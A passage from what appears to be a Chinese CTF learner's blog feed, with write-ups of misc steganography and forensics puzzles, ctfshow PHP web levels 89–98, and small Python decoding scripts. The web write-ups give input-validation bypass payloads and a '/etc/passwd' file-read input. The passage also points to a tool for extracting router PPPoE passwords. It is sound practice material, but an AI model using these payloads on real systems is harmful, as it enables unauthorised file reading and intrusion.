src="https://img-blog.csdnimg.cn/34523b294c11405f937fc06250009878.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5byA5b-D5pif5Lq6,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>save bin为png格式，得到二维码，扫码得flag</p><h2 id="rar"><a href="#rar" class="headerlink" title="rar"></a>rar</h2><p>题目提示4位密码，直接archpr暴力破解<br>拿到flag</p><h2 id="zip伪加密"><a href="#zip伪加密" class="headerlink" title="zip伪加密"></a>zip伪加密</h2><p><img src="https://img-blog.csdnimg.cn/f5c3ea3149c24935a910198b053bb085.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5byA5b-D5pif5Lq6,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>题目说了伪加密<br>直接把两个09改成00<br>得到flag</p><h2 id="被嗅探的流量"><a href="#被嗅探的流量" class="headerlink" title="被嗅探的流量"></a>被嗅探的流量</h2><p>丢进wireshark，搜flag<br><code>tcp contains &quot;flag&quot;</code><br><img src="https://img-blog.csdnimg.cn/c44566aeef3a451580ee945c7bcef94a.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5byA5b-D5pif5Lq6,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>追踪流，应该是在上传一张图片<br>导出HTTP对象<br><img src="https://img-blog.csdnimg.cn/1d53ba1001e14381a172cc8819eccbb3.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5byA5b-D5pif5Lq6,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>有一个很大，打开就是正在上传的图片<br><img src="https://img-blog.csdnimg.cn/bc489631d4c5415aa09cbce1dc03019b.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5byA5b-D5pif5Lq6,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>丢进010editor，把文件头多余的部分删掉，得到图片<br>然后发现其实flag就在文件尾<br><img src="https://img-blog.csdnimg.cn/9cbf77f1021b4eacb343c7815fbe0c71.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5byA5b-D5pif5Lq6,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p><h2 id="镜子里面的世界"><a href="#镜子里面的世界" class="headerlink" title="镜子里面的世界"></a>镜子里面的世界</h2><p>丢进010editor什么都没有<br>打开stegsolve<br>LSB<br><img src="https://img-blog.csdnimg.cn/116956150826470993a9e6ce3840c7a4.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5byA5b-D5pif5Lq6,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>拿到flag</p><h2 id="qr"><a href="#qr" class="headerlink" title="qr"></a>qr</h2><p>解码即可</p><h2 id="ningen"><a href="#ningen" class="headerlink" title="ningen"></a>ningen</h2><p>文件尾发现zip，导出<br><img src="https://img-blog.csdnimg.cn/ff041372eaae4c46beff65e538f850fe.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5byA5b-D5pif5Lq6,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>题目提示了4位密码<br>爆破得flag</p><h2 id="小明的保险箱"><a href="#小明的保险箱" class="headerlink" title="小明的保险箱"></a>小明的保险箱</h2><p>文件尾发现rar<br><img src="https://img-blog.csdnimg.cn/0a79f464561e45f4a59c76d2874e41fd.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5byA5b-D5pif5Lq6,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>提示4位数字密码，爆破，得flag</p><h2 id="爱因斯坦"><a href="#爱因斯坦" class="headerlink" title="爱因斯坦"></a>爱因斯坦</h2><p>文件尾发现zip<br>需要密码<br><img src="https://img-blog.csdnimg.cn/e708a3d977fd49c783a08b4698893833.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5byA5b-D5pif5Lq6,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>好像是真加密（哈哈，下次好好研究一下）<br>密码在exif里面<br>解密得flag</p><h2 id="easycap"><a href="#easycap" class="headerlink" title="easycap"></a>easycap</h2><p>直接追踪流，flag就在里面</p><h2 id="隐藏的钥匙"><a href="#隐藏的钥匙" class="headerlink" title="隐藏的钥匙"></a>隐藏的钥匙</h2><p><img src="https://img-blog.csdnimg.cn/da7399bf713b496195d344bf6c19e552.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5byA5b-D5pif5Lq6,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>base64解密得flag</p><h2 id="另外一个世界"><a href="#另外一个世界" class="headerlink" title="另外一个世界"></a>另外一个世界</h2><p><img src="https://img-blog.csdnimg.cn/4156201184f44f75ac77f0aeee0277e1.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5byA5b-D5pif5Lq6,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>文件尾有一串很奇怪的二进制，二进制转字符得flag<br>本来想如果不想再考虑培根、敲击码、博多码</p><h2 id="FLAG"><a href="#FLAG" class="headerlink" title="FLAG"></a>FLAG</h2><p>010editor看什么都没有<br><img src="https://img-blog.csdnimg.cn/3b7eb90ea82b4187909bb7426dac68a8.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5byA5b-D5pif5Lq6,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p><p>得到zip<br>一个没有后缀名的文件<br><img src="https://img-blog.csdnimg.cn/90c9afd1ee174c9eaf024b01515e2c90.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5byA5b-D5pif5Lq6,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>改后缀为elf<br>丢入exeinfo看下<br><img src="https://img-blog.csdnimg.cn/a923f0c671d44cdcaef2fdff34c3abfb.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5byA5b-D5pif5Lq6,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>丢入ida64<br><img src="https://img-blog.csdnimg.cn/4ba4eac2ac70480aad0677f2657cd564.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5byA5b-D5pif5Lq6,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p><p>拿到flag</p><h2 id="假如给我三天光明"><a href="#假如给我三天光明" class="headerlink" title="假如给我三天光明"></a>假如给我三天光明</h2><p><img src="https://img-blog.csdnimg.cn/e20a9beb12ac4120a2bb2dd04367bed5.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5byA5b-D5pif5Lq6,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>在stegsolve里看就觉得有点奇怪，再看原图，联想海伦凯勒，是盲文<br><img src="https://img-blog.csdnimg.cn/edad4b0946074f3db3d7fc7e830d4e3a.png" alt="在这里插入图片描述"><br><a href="https://www.cnblogs.com/gwind/p/8009861.html">https://www.cnblogs.com/gwind/p/8009861.html</a></p><p><code>kmdonowg</code><br>这就是压缩包的密码，解密得到wav<br>丢如Audicity<br><img src="https://img-blog.csdnimg.cn/6d5cc877699d498fb4533da85efca5b4.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5byA5b-D5pif5Lq6,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>morse密码啊<br><img src="https://img-blog.csdnimg.cn/7c87aebdd2d642cd86dd169c45d97027.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5byA5b-D5pif5Lq6,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p><p>得到flag</p><h2 id="神秘龙卷风"><a href="#神秘龙卷风" class="headerlink" title="神秘龙卷风"></a>神秘龙卷风</h2><p>题目提示四位密码，archpr爆破<br><img src="https://img-blog.csdnimg.cn/33bf8ee7b7b440e09691b77923735862.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5byA5b-D5pif5Lq6,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>真的是龙卷<img src="https://img-blog.csdnimg.cn/4f39a141f42944b09633f207d5ed3378.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5byA5b-D5pif5Lq6,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>符合brainfuck特征，但是解密解不出来，看别人wp才知道，要跑这个brainfuck代码</p><p><img src="https://img-blog.csdnimg.cn/b2282935da11464aa1be15d071514005.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5byA5b-D5pif5Lq6,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>运行网址：<a href="http://bf.doleczek.pl/">http://bf.doleczek.pl/</a></p><h2 id="后门查杀"><a href="#后门查杀" class="headerlink" title="后门查杀"></a>后门查杀</h2><p>这一题我没有写出来，看了别人的wp<br>用webshell查杀工具D盾<br><img src="https://img-blog.csdnimg.cn/4153d758a8714204ab6ba6cf22dca6c9.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5byA5b-D5pif5Lq6,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/77acfb952c514942bbf4e15b15d9f836.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5byA5b-D5pif5Lq6,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>找到了flag</p><h2 id="数据包中的线索"><a href="#数据包中的线索" class="headerlink" title="数据包中的线索"></a>数据包中的线索</h2><p>追踪了几个流看不出来什么<br>导出对象<img src="https://img-blog.csdnimg.cn/0cffd487585e40128fe1078c144f4e87.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5byA5b-D5pif5Lq6,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>文件名fenxi<br>应该是base64<br><img src="https://img-blog.csdnimg.cn/36919853b87f4707a65233e1759ae741.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5byA5b-D5pif5Lq6,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>看到JIFF<br>base64转图片<br><img src="https://img-blog.csdnimg.cn/3033f11a8508438daf973d613e368776.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5byA5b-D5pif5Lq6,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p><h2 id="荷兰宽带数据泄露"><a href="#荷兰宽带数据泄露" class="headerlink" title="荷兰宽带数据泄露"></a>荷兰宽带数据泄露</h2><p>这一题给出的是.bin文件，wireshark打不开<br>.bin文件是路由器配置文件<br><a href="https://www.xinsaisai.com/router-pppoe-password-view.html">路由器宽带配置文件知识点</a></p><p>需要下载个软件RouterPassView<br><a href="http://file.xinsaisai.com/201508/RouterPassView_1.45.zip">点击下载</a></p><p>打开后搜索username即可</p><h2 id="来首歌吧"><a href="#来首歌吧" class="headerlink" title="来首歌吧"></a>来首歌吧</h2><p><img src="https://img-blog.csdnimg.cn/1f64852e009f45bc8694c0ba717e436b.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5byA5b-D5pif5Lq6,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>morse密码解码即可</p><h2 id="webshell后门"><a href="#webshell后门" class="headerlink" title="webshell后门"></a>webshell后门</h2><p><img src="https://img-blog.csdnimg.cn/87363c9c39fd46168e85bb38723f35be.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5byA5b-D5pif5Lq6,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>和后门查杀那一题一样</p><h2 id="面具下的flag"><a href="#面具下的flag" class="headerlink" title="面具下的flag"></a>面具下的flag</h2><p>图片尾有个zip<br>zip里面有一个vmdk文件</p>]]></content>
    
    
      
      
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;如果大家有任何问题，都可以随时问我，我也是刚入坑不久的小白，大家共同进步&lt;/p&gt;
&lt;/blockquote&gt;
&lt;hr&gt;
&lt;h2 id=&quot;金三胖&quot;&gt;&lt;a href=&quot;#金三胖&quot; class=&quot;headerlink&quot; title=&quot;金三胖&quot;&gt;&lt;/a&gt;金</summary>
      
    
    
    
    
    <category term="misc" scheme="https://zhangkaibin0921.github.io/tags/misc/"/>
    
  </entry>
  
  <entry>
    <title>ctfshow php特性</title>
    <link href="https://zhangkaibin0921.github.io/2022/03/07/ctfshow-php%E7%89%B9%E6%80%A7/"/>
    <id>https://zhangkaibin0921.github.io/2022/03/07/ctfshow-php%E7%89%B9%E6%80%A7/</id>
    <published>2022-03-07T12:58:37.000Z</published>
    <updated>2022-03-07T12:59:18.372Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>因为没钱充ctfshow会员，只能跟着视频教程白嫖</p></blockquote><h2 id="89"><a href="#89" class="headerlink" title="89"></a>89</h2><p><img src="https://img-blog.csdnimg.cn/4c3b3e828f944a07b8fc23db9c4e0e83.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5byA5b-D5pif5Lq6,size_16,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>intval绕过<br>提交一个不为空的数组即可绕过<br><code>?num[]=         //就直接绕过了</code><br><a href="https://www.runoob.com/php/php-intval-function.html">intval详解</a></p><h2 id="90"><a href="#90" class="headerlink" title="90"></a>90</h2><p><img src="https://img-blog.csdnimg.cn/797769d0ef8245c5aadba628170c4681.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5byA5b-D5pif5Lq6,size_15,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>进制转换直接绕过<br><code>?num=0x117c</code></p><h2 id="91"><a href="#91" class="headerlink" title="91"></a>91</h2><p><img src="https://img-blog.csdnimg.cn/5aa1719f84164a35b286d073804d7823.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5byA5b-D5pif5Lq6,size_15,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br><code>preg_match(&#39;/^php$/i&#39; , $a)</code><br>终于知道后面地i是什么意思了，是匹配模式<br>i是大小写，m是多行匹配</p><p><code>?cmd=%0aphp</code>    //通过换行来绕过<br><code>preg_match(&#39;/^php$/i&#39; , $a)</code>    //这个正则这匹配一行</p><h2 id="92"><a href="#92" class="headerlink" title="92"></a>92</h2><p><img src="https://img-blog.csdnimg.cn/72ef6e7ed988497aab8345e6d1255462.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5byA5b-D5pif5Lq6,size_15,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>看intval的那个教程<br>如果 base 是 0，通过检测 var 的格式来决定使用的进制：<br>如果字符串包括了 “0x” (或 “0X”) 的前缀，使用 16 进制 (hex)；否则，<br>如果字符串以 “0” 开始，使用 8 进制(octal)；否则，<br>将使用 10 进制 (decimal)。</p><p><code>?num=010574</code><br><code>?num=0x117c</code></p><h2 id="93"><a href="#93" class="headerlink" title="93"></a>93</h2><p><img src="https://img-blog.csdnimg.cn/a7a981d3434648ce96434c6c4602ca55.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5byA5b-D5pif5Lq6,size_17,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>字母被ban了<br><code>?num=010574</code></p><h2 id="94"><a href="#94" class="headerlink" title="94"></a>94</h2><p><img src="https://img-blog.csdnimg.cn/546bbe228c8f4eeba7be6db7d3f9f593.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5byA5b-D5pif5Lq6,size_17,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>strpos() 函数查找字符串在另一字符串中第一次出现的位置。<br>所以num中肯定要存在0，但不能是第一个<br><code>num=4476.0</code></p><h2 id="95"><a href="#95" class="headerlink" title="95"></a>95</h2><p><img src="https://img-blog.csdnimg.cn/8a2826191b4843a09db096cf00ed3fd0.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5byA5b-D5pif5Lq6,size_17,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br><code>num=_010574</code>    //010574是4476八进制形式，因为要有0，但是这个不行<br>intval(_010574)  ===  4476 没过</p><p><code>num=+010574</code> //过了<br>对加号进行编码，也行<br><code>num=%27010574</code><br>空格也是可以的<br><code>num= 010574</code><br><code>num=%20010574</code><br>空格进行编码也可以</p><h2 id="96"><a href="#96" class="headerlink" title="96"></a>96</h2><p><img src="https://img-blog.csdnimg.cn/35493138817c431c919bc88f49e12b69.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5byA5b-D5pif5Lq6,size_17,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br> <code>u=/etc/passwd</code>   //可以读文件<br> 就是你要找到flag.php的位置<br> <code>u=./flag.php</code><br>  <code>u=/var/www/html/flag.php</code>    //看报错得到这个绝对路径<br>      <code>u=/var/www/html/../html/flag.php</code> </p><h2 id="97"><a href="#97" class="headerlink" title="97"></a>97</h2><p><img src="https://img-blog.csdnimg.cn/dea8a3bce4c0410e8ce49c6b67f7bf47.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5byA5b-D5pif5Lq6,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p><p>传数组<br><code>a[]=1&amp;b[]=2</code></p><h2 id="98"><a href="#98" class="headerlink" title="98"></a>98</h2><p><img src="https://img-blog.csdnimg.cn/9e274712797e4886921b2639fa22800a.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5byA5b-D5pif5Lq6,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;因为没钱充ctfshow会员，只能跟着视频教程白嫖&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&quot;89&quot;&gt;&lt;a href=&quot;#89&quot; class=&quot;headerlink&quot; title=&quot;89&quot;&gt;&lt;/a&gt;89&lt;/h2&gt;&lt;p&gt;&lt;img src=&quot;</summary>
      
    
    
    
    
    <category term="web" scheme="https://zhangkaibin0921.github.io/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>misc音频题目</title>
    <link href="https://zhangkaibin0921.github.io/2022/02/27/misc%E9%9F%B3%E9%A2%91%E9%A2%98%E7%9B%AE/"/>
    <id>https://zhangkaibin0921.github.io/2022/02/27/misc%E9%9F%B3%E9%A2%91%E9%A2%98%E7%9B%AE/</id>
    <published>2022-02-27T02:55:29.000Z</published>
    <updated>2022-02-27T03:11:42.532Z</updated>
    
    <content type="html"><![CDATA[<h1 id="GUET-CTF2019-soul-sipse"><a href="#GUET-CTF2019-soul-sipse" class="headerlink" title="[GUET-CTF2019]soul sipse"></a>[GUET-CTF2019]soul sipse</h1><p>给了一个out.wav，音频和频谱图什么都看不出来<br>是音频隐写的题目<br>steghide （这个工具即可音频隐写也可以图片隐写）（kali自带）</p><p><code>steghide extract -sf out.wav</code><br>无密码，提取得到一个txt文件：<a href="https://share.weiyun.com/5wVTIN3">https://share.weiyun.com/5wVTIN3</a><br>得到一张图片，文件头错了，修一下<br>得到<code>\u0034\u0030\u0037\u0030\u000d\u000a\u0031\u0032\u0033\u0034\u000d\u000a</code></p><p>Unicode解码得到<br><img src="/picture/misc69.png"><br>所以flag为flag{5304}</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;GUET-CTF2019-soul-sipse&quot;&gt;&lt;a href=&quot;#GUET-CTF2019-soul-sipse&quot; class=&quot;headerlink&quot; title=&quot;[GUET-CTF2019]soul sipse&quot;&gt;&lt;/a&gt;[GUET-CTF2019]so</summary>
      
    
    
    
    
    <category term="misc" scheme="https://zhangkaibin0921.github.io/tags/misc/"/>
    
  </entry>
  
  <entry>
    <title>常见脚本</title>
    <link href="https://zhangkaibin0921.github.io/2022/02/27/%E5%B8%B8%E8%A7%81%E8%84%9A%E6%9C%AC/"/>
    <id>https://zhangkaibin0921.github.io/2022/02/27/%E5%B8%B8%E8%A7%81%E8%84%9A%E6%9C%AC/</id>
    <published>2022-02-27T01:43:56.000Z</published>
    <updated>2022-03-10T08:28:58.995Z</updated>
    
    <content type="html"><![CDATA[<h1 id="base一把梭"><a href="#base一把梭" class="headerlink" title="base一把梭"></a>base一把梭</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><br><br><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">import</span> re<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">baseDec</span>(<span class="hljs-params">text,<span class="hljs-built_in">type</span></span>):</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">type</span> == <span class="hljs-number">1</span>:<br>        <span class="hljs-keyword">return</span> base64.b16decode(text)<br>    <span class="hljs-keyword">elif</span> <span class="hljs-built_in">type</span> == <span class="hljs-number">2</span>:<br>        <span class="hljs-keyword">return</span> base64.b32decode(text)<br>    <span class="hljs-keyword">elif</span> <span class="hljs-built_in">type</span> == <span class="hljs-number">3</span>:<br>        <span class="hljs-keyword">return</span> base64.b64decode(text)<br>    <span class="hljs-keyword">elif</span> <span class="hljs-built_in">type</span> == <span class="hljs-number">4</span>:<br>        <span class="hljs-keyword">return</span> base64.b85decode(text)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">pass</span><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">detect</span>(<span class="hljs-params">text</span>):</span><br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-keyword">if</span> re.match(<span class="hljs-string">&quot;^[0-9A-F=]+$&quot;</span>,text.decode()) <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span>:<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">1</span><br>    <span class="hljs-keyword">except</span>:<br>        <span class="hljs-keyword">pass</span><br>    <br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-keyword">if</span> re.match(<span class="hljs-string">&quot;^[A-Z2-7=]+$&quot;</span>,text.decode()) <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span>:<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">2</span><br>    <span class="hljs-keyword">except</span>:<br>        <span class="hljs-keyword">pass</span><br><br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-keyword">if</span> re.match(<span class="hljs-string">&quot;^[A-Za-z0-9+/=]+$&quot;</span>,text.decode()) <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span>:<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">3</span><br>    <span class="hljs-keyword">except</span>:<br>        <span class="hljs-keyword">pass</span><br>    <br>    <span class="hljs-keyword">return</span> <span class="hljs-number">4</span><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">autoDec</span>(<span class="hljs-params">text</span>):</span><br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">b&quot;MRCTF&#123;&quot;</span> <span class="hljs-keyword">in</span> text:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;\n&quot;</span>+text.decode())<br>            <span class="hljs-keyword">break</span><br><br>        code = detect(text)<br>        text = baseDec(text,code)<br><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;flag.txt&quot;</span>,<span class="hljs-string">&#x27;rb&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>    flag = f.read()<br><br>autoDec(flag)<br><br></code></pre></td></tr></table></figure><h1 id="0、1转二维码"><a href="#0、1转二维码" class="headerlink" title="0、1转二维码"></a>0、1转二维码</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> PIL <span class="hljs-keyword">import</span> Image<br><span class="hljs-keyword">from</span> zlib <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> gmpy2<br><br><span class="hljs-built_in">str</span> =<span class="hljs-string">&quotquot;</span><br>lens=<span class="hljs-built_in">len</span>(<span class="hljs-built_in">str</span>)<br><br>MAX = gmpy2.iroot(lens,<span class="hljs-number">2</span>)[<span class="hljs-number">0</span>]<br>pic = Image.new(<span class="hljs-string">&quot;RGB&quot;</span>,(MAX,MAX))<br>i=<span class="hljs-number">0</span><br><span class="hljs-keyword">for</span> y <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,MAX):<br>    <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,MAX):<br>        <span class="hljs-keyword">if</span>(<span class="hljs-built_in">str</span>[i] == <span class="hljs-string">&#x27;1&#x27;</span>):<br>            pic.putpixel([x,y],(<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>))<br>        <span class="hljs-keyword">else</span>:pic.putpixel([x,y],(<span class="hljs-number">255</span>,<span class="hljs-number">255</span>,<span class="hljs-number">255</span>))<br>        i = i+<span class="hljs-number">1</span><br>pic.show()<br>pic.save(<span class="hljs-string">&quot;flag.png&quot;</span>)<br></code></pre></td></tr></table></figure><h1 id="翻转文件十六进制"><a href="#翻转文件十六进制" class="headerlink" title="翻转文件十六进制"></a>翻转文件十六进制</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><br>f = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;E:/ctf/ctfshow/misc/stega10/n/n.png&#x27;</span>, <span class="hljs-string">&#x27;rb&#x27;</span>).read()<br>res = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;E:/ctf/ctfshow/misc/stega10/n/n2.png&#x27;</span>, <span class="hljs-string">&#x27;wb&#x27;</span>)<br>res.write(f[::-<span class="hljs-number">1</span>])<br></code></pre></td></tr></table></figure><h1 id="多行base密文解密"><a href="#多行base密文解密" class="headerlink" title="多行base密文解密"></a>多行base密文解密</h1><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs vim">#python2<br>b64chars = <span 